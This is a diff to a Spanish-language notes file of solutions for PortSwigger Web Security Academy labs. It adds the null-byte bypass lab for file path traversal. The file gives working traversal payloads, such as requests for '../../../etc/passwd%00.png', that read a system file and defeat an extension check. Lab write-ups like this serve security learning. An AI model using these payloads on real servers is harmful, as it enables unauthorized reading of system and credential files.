@@ -115,6 +115,12 @@ Hacer una request a https://LABID.web-security-academy.net/image?filename=..%252
 
 Hacer una request a https://LABID.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
 
+### [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
+
+#### Solución:
+
+Hacer una request a https://LABID.web-security-academy.net/image?filename=../../../etc/passwd%00.png
+
 ---
 
 ## [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
